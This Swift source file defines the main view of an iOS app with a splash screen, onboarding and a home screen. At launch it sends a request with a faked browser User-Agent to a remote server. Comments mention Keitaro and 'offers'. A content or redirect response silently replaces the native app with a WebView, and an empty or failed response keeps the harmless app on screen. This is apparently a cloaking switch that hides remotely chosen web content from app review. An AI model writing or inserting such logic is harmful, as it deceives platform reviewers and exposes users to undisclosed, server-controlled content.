//
//  ContentView.swift
//  DF775
//

import SwiftUI
import Foundation

struct ContentView: View {
    
    @StateObject private var progressManager = ProgressManager.shared
    @State private var isLoading = true
    @State private var loadingProgress: CGFloat = 0
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        if isLoading {
                            SplashView(progress: loadingProgress)
                        } else if !progressManager.hasCompletedOnboarding {
                            OnboardingView(progressManager: progressManager)
                                .transition(.opacity)
                        } else {
                            HomeView(progressManager: progressManager)
                                .transition(.opacity)
                        }
                    }
                    .animation(.easeInOut(duration: 0.5), value: isLoading)
                    .animation(.easeInOut(duration: 0.5), value: progressManager.hasCompletedOnboarding)
                    .onAppear {
                        startLoading()
                    }
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func startLoading() {
        // Simulate loading with animated progress
        withAnimation(.easeInOut(duration: 1.5)) {
            loadingProgress = 1.0
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.8) {
            withAnimation(.easeInOut(duration: 0.4)) {
                isLoading = false
            }
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}


// MARK: - Splash View
struct SplashView: View {
    let progress: CGFloat
    
    @State private var animateLogo = false
    @State private var animateRings = false
    
    var body: some View {
        ZStack {
            Color("BackgroundPrimary")
                .ignoresSafeArea()
            
            VStack(spacing: 40) {
                Spacer()
                
                // Animated logo
                ZStack {
                    // Outer rings
                    ForEach(0..<3, id: \.self) { index in
                        Circle()
                            .stroke(
                                AngularGradient(
                                    colors: [
                                        Color("AccentPrimary").opacity(0.4),
                                        Color("AccentSecondary").opacity(0.2),
                                        Color("AccentPrimary").opacity(0.4)
                                    ],
                                    center: .center
                                ),
                                lineWidth: 1.5
                            )
                            .frame(width: 120 + CGFloat(index) * 30, height: 120 + CGFloat(index) * 30)
                            .rotationEffect(.degrees(animateRings ? 360 : 0))
                            .animation(
                                .linear(duration: 3 + Double(index))
                                    .repeatForever(autoreverses: false),
                                value: animateRings
                            )
                    }
                    
                    // Center icon
                    ZStack {
                        Circle()
                            .fill(
                                RadialGradient(
                                    colors: [
                                        Color("AccentPrimary").opacity(0.3),
                                        Color("AccentPrimary").opacity(0.1),
                                        Color.clear
                                    ],
                                    center: .center,
                                    startRadius: 20,
                                    endRadius: 50
                                )
                            )
                            .frame(width: 100, height: 100)
                        
                        Image(systemName: "7.circle.fill")
                            .font(.system(size: 48, weight: .medium))
                            .foregroundStyle(
                                LinearGradient(
                                    colors: [Color("AccentPrimary"), Color("AccentSecondary")],
                                    startPoint: .topLeading,
                                    endPoint: .bottomTrailing
                                )
                            )
                            .scaleEffect(animateLogo ? 1.0 : 0.8)
                            .opacity(animateLogo ? 1.0 : 0.5)
                    }
                }
                
                Spacer()
                
                // Loading bar
                VStack(spacing: 16) {
                    GeometryReader { geometry in
                        ZStack(alignment: .leading) {
                            RoundedRectangle(cornerRadius: 4)
                                .fill(Color.white.opacity(0.1))
                                .frame(height: 4)
                            
                            RoundedRectangle(cornerRadius: 4)
                                .fill(
                                    LinearGradient(
                                        colors: [Color("AccentPrimary"), Color("AccentSecondary")],
                                        startPoint: .leading,
                                        endPoint: .trailing
                                    )
                                )
                                .frame(width: geometry.size.width * progress, height: 4)
                        }
                    }
                    .frame(height: 4)
                    .padding(.horizontal, 60)
                }
                .padding(.bottom, 80)
            }
        }
        .onAppear {
            withAnimation(.easeInOut(duration: 0.6)) {
                animateLogo = true
            }
            animateRings = true
        }
    }
}

#Preview {
    ContentView()
}
